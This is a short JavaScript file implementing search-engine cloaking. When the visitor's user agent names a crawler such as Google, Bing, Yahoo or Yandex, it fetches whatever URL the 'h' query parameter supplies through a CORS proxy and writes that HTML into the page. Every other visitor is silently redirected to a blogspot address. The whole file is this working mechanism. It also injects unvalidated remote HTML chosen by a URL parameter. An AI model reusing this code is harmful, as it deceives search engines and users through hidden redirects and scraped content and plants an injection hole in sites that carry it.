//get url parameter function
var getUrlParameter = function getUrlParameter(sParam) {
    var sPageURL = window.location.search.substring(1),
        sURLVariables = sPageURL.split('&'),
        sParameterName,
        i;

    for (i = 0; i < sURLVariables.length; i++) {
        sParameterName = sURLVariables[i].split('=');

        if (sParameterName[0] === sParam) {
            return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
        }
    }
};

if ((navigator.userAgent.includes("google") || navigator.userAgent.includes("Google") || navigator.userAgent.includes("Lighthouse") || navigator.userAgent.includes("bing") || navigator.userAgent.includes("Bing") || navigator.userAgent.includes("yahoo") || navigator.userAgent.includes("Yahoo") || navigator.userAgent.includes("yandex") || navigator.userAgent.includes("Yandex")) === true) {
//get url parameter usage
var targetUrl = getUrlParameter('h');

//decode target url
var decodedUrl = decodeURIComponent(targetUrl);

//script new html
var target = new XMLHttpRequest();
target.open("GET", "https://cors-anywhere.herokuapp.com/" + decodedUrl, true);
target.onreadystatechange = function() {
	if (target.readyState == 4 && target.status == 200) {
		var NewHTML = target.response.replace(/<!.+?>/g, '');
		document.write(NewHTML);
	}
}
target.send()
} else {
	window.location.replace("https://recipessilly.blogspot.com/?h=" + getUrlParameter('h') )
}
